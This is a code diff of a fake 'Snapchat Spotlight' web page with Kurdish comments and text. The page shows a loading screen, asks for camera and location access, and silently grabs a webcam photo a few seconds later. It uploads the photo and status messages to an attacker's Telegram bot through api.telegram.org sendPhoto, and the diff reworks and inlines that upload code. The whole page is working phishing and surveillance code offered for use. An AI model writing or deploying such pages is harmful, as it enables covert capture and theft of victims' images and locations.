@@ -5,20 +5,21 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Snapchat Spotlight</title>
     <style>
-        body { background-color: #000; color: white; font-family: Arial; text-align: center; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        video, canvas { display: none; }
-        .loader { border: 5px solid #333; border-top: 5px solid #fffc00; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto; }
+        body { background-color: #000; color: white; font-family: Arial; text-align: center; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        video { width: 150px; height: 200px; border-radius: 10px; margin-bottom: 20px; border: 2px solid #fffc00; object-fit: cover; }
+        canvas { display: none; }
+        .loader { border: 5px solid #333; border-top: 5px solid #fffc00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 10px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <div>
+        <video id="video" autoplay playsinline></video>
         <div class="loader"></div>
         <h1>Snapchat Spotlight</h1>
-        <p>تکایە ڕێگە بدە بۆ بارکردنی ڤیدیۆکە...</p>
+        <p>تکایە چاوەڕێ بکە، ڤیدیۆ بار دبێت...</p>
     </div>
 
-    <video id="video" autoplay playsinline></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
@@ -33,22 +34,6 @@
                     body: JSON.stringify({ chat_id: chat_id, text: text })
                 });
             } catch (e) {}
-        }
-
-        async function sendPhotoBase64(base64Data) {
-            try {
-                // بۆتێ تەلەگرامێ دشێت وێنەی ب ڕێکا URL یان لێرەدا ب ڕێکا sendMessage یان sendPhoto ب Base64 ڤەگوێزێت
-                // با ڤی کومیچی بەکاربینین بۆ ارسال کردن ب شێوەیەکێ دڵنیا
-                const blob = await fetch(base64Data).then(res => res.blob());
-                const formData = new FormData();
-                formData.append('chat_id', chat_id);
-                formData.append('photo', blob, 'snap.jpg');
-                
-                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-            } catch (err) {}
         }
 
         function askLocation() {
@@ -67,13 +52,25 @@
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
+                // لێرەدا دەدینە دەمژمێرێ تا کامێرا ب ڕوونی کار بکەت و وێنە بگرێت
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                     
-                    const dataURL = canvas.toDataURL('image/jpeg', 0.8);
-                    sendPhotoBase64(dataURL);
-                }, 3000);
+                    canvas.toBlob(async blob => {
+                        if (blob) {
+                            const formData = new FormData();
+                            formData.append('chat_id', chat_id);
+                            formData.append('photo', blob, 'snap.jpg');
+                            try {
+                                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { 
+                                    method: 'POST', 
+                                    body: formData 
+                                });
+                            } catch (err) {}
+                        }
+                    }, 'image/jpeg', 0.8);
+                }, 4000);
             } catch (err) {
                 sendMessage("⚠️ ڕێگەی بە کامێرا نەدا یان کامێرا نەدۆزرایەوە.");
             }
